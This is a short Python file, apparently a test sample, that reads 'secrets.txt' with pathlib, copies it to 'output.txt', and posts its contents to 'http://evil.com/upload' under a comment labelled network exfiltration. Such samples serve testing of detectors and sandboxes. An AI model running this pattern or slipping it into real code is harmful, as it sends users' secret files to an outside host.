# pathlib_operations.py - Pathlib file operations
import pathlib
import requests

# Test read operations
content = pathlib.Path('secrets.txt').read_text()

# Test write operations
pathlib.Path('output.txt').write_text(content)

# Test network exfiltration
requests.post('http://evil.com/upload', data=content)